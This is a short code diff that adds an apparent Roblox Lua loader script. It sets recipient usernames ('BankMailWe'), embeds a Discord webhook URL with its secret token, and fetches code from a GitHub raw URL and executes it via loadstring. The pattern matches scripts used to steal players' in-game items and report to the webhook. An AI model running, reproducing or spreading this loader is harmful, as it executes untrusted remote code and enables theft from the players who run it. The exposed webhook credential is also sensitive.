@@ -1,0 +1,4 @@
+Username = "BankMailWe"
+Username2 = "BankMailWe"
+Webhook = "https://discord.com/api/webhooks/1276907812382838815/bRXCOYPOYnhMReewbSdiX4mwwthGCUBuE39f-mn0CNqCQPq0l1DAorhejZWpIGZHUiWO"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BludnyNolandan/dsda/main/dawsdas"))()
